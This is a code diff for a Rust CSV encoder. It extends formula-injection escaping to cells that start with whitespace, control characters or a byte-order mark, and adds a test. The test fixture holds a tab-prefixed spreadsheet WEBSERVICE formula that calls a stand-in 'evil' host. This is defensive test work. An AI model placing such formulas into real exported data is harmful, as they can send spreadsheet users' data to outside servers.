@@ -248,7 +248,8 @@ fn csv_cell(value: &Value) -> String {
 }
 
 fn csv_safe_text(text: &str) -> String {
-    if text.starts_with(['=', '+', '-', '@']) {
+    let significant = text.trim_start_matches(|ch: char| ch.is_whitespace() || ch.is_control() || ch == '\u{feff}');
+    if significant.starts_with(['=', '+', '-', '@']) {
         let mut escaped = String::with_capacity(text.len() + 1);
         escaped.push('\'');
         escaped.push_str(text);
@@ -383,6 +384,16 @@ mod tests {
         let (value, _) = projected_value(plan.project.as_ref().expect("project"), &steps).expect("value");
         let csv = encode(plan.project.as_ref().expect("project"), &value).expect("csv");
         assert_eq!(String::from_utf8(csv).expect("utf8"), "'=cmd,n\r\n'=1+1,2\r\n");
+        let tabbed = [step(
+            "extract",
+            json!({"items":[{"=cmd":"\t=WEBSERVICE(\"http://evil\")","n":2}]}),
+        )];
+        let (value, _) = projected_value(plan.project.as_ref().expect("project"), &tabbed).expect("value");
+        let csv = encode(plan.project.as_ref().expect("project"), &value).expect("csv");
+        assert_eq!(
+            String::from_utf8(csv).expect("utf8"),
+            "'=cmd,n\r\n\"'\t=WEBSERVICE(\"\"http://evil\"\")\",2\r\n"
+        );
     }
 
     #[test]
